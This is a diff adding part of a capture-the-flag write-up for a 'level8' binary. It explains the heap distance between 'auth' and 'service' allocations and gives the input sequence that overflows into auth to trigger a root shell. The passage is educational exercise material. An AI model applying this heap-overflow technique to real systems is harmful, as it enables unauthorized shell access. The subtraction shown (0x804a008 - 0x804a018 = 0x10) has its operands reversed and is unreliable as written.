@@ -124,4 +124,29 @@ after do that the heap will be like that:
               | 00 00 00 00      |                    | "AAA ... \0"      |
               +------------------+                    +-------------------+
 ```
+but there is something important to know in the heap allocation, in this case we found
 
+auth starts at      0x804a008
+service starts at   0x804a018
+difference =        16 bytes // 0x804a008 - 0x804a018 = 0x10 = 16 bytes
+
+4 bytes  → auth's user data
+12 bytes → allocator-managed space (metadata/alignment)
+16 bytes → total distance
+
+that mean we need just another 16 bytes to make the if statement true and run the system("/bin/sh") command.
+
+here is the final solution to the problem:
+
+```bash
+./level8
+
+auth 
+
+service AAAAAAAAAAAAAAAA
+
+login
+
+```
+
+after that we will get the shell.
